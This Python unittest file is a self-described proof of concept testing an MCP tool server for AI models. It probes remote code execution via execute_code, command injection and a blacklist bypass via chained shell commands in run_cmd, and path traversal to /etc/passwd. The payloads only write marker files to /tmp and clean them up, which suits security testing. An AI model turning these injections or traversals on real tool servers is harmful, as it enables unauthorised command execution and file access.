"""
POC Exploit for LLMC MCP Server Vulnerabilities.

1. RCE via execute_code
2. Command Injection via run_cmd
3. Path Traversal/FS Access Check
"""

import os
from pathlib import Path
import sys
import unittest

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from llmc_mcp.tools.cmd import run_cmd
from llmc_mcp.tools.code_exec import execute_code
from llmc_mcp.tools.fs import PathSecurityError, validate_path


class TestExploits(unittest.TestCase):

    def test_1_rce_execute_code(self):
        """
        Exploit execute_code to run arbitrary system commands.
        """
        print("\n[+] Testing RCE via execute_code...")

        # Malicious code that imports os and writes a file
        payload = """
import os
with open('/tmp/pwned_rce', 'w') as f:
    f.write('REM WAS HERE')
_result_ = 'Success'
"""

        # Dummy tool caller
        def dummy_caller(name, args):
            return {"data": "mock"}

        result = execute_code(code=payload, tool_caller=dummy_caller)

        if result.success:
            print("  [!] Code execution successful.")
            if os.path.exists("/tmp/pwned_rce"):
                print("  [!!!] RCE CONFIRMED: File /tmp/pwned_rce created.")
                with open("/tmp/pwned_rce") as f:
                    print(f"  [i] Content: {f.read()}")
                os.remove("/tmp/pwned_rce")
            else:
                print("  [?] Code ran but file not found.")
        else:
            print(f"  [-] Execution failed: {result.error}")

    def test_2_cmd_injection(self):
        """
        Exploit run_cmd to bypass 'blacklist' and run arbitrary commands.
        """
        print("\n[+] Testing Command Injection via run_cmd...")

        # The code uses a blacklist. If the list is empty (default), anything goes.
        # Even if 'ls' was allowed, we can chain commands.

        # Attack 1: Direct execution (since blacklist is empty by default/misconfig)
        cmd1 = "echo 'pwned_cmd' > /tmp/pwned_cmd"

        # Attack 2: Chaining (if 'echo' was allowed but others blocked)
        cmd2 = "echo safe; touch /tmp/pwned_cmd_chain"

        print(f"  [i] Attempting: {cmd1}")
        res1 = run_cmd(command=cmd1, cwd=".", blacklist=[])

        if res1.success and os.path.exists("/tmp/pwned_cmd"):
            print("  [!!!] CMD INJECTION CONFIRMED: /tmp/pwned_cmd created.")
            os.remove("/tmp/pwned_cmd")
        else:
            print(f"  [-] Direct exec failed: {res1.error}")

        print(f"  [i] Attempting chain: {cmd2}")
        res2 = run_cmd(command=cmd2, cwd=".", blacklist=["touch"])
        # Note: blacklist checks the binary of the *whole command string* which is 'echo'.
        # 'touch' is just an argument to the shell.

        if res2.success and os.path.exists("/tmp/pwned_cmd_chain"):
            print("  [!!!] BLACKLIST BYPASS CONFIRMED: /tmp/pwned_cmd_chain created.")
            os.remove("/tmp/pwned_cmd_chain")
        else:
            print(f"  [-] Chain exec failed: {res2.error}")

    def test_3_path_traversal(self):
        """
        Test Path Traversal protections.
        """
        print("\n[+] Testing Path Traversal...")

        # Case A: Allowed root is "."
        allowed = ["."]
        try:
            # Try to go up
            validate_path("../../../etc/passwd", allowed)
            print("  [!!!] PATH TRAVERSAL SUCCESS: ../../../etc/passwd accepted.")
        except PathSecurityError:
            print("  [+] Path traversal blocked correctly for '.' root.")

        # Case B: Empty allowed roots (Misconfiguration)
        allowed_empty = []
        try:
            p = validate_path("/etc/passwd", allowed_empty)
            print(f"  [!!!] DANGEROUS CONFIG: Empty allowed_roots allows access to {p}")
        except PathSecurityError:
            print("  [+] Path traversal blocked for empty root (Unexpected).")


if __name__ == "__main__":
    unittest.main()
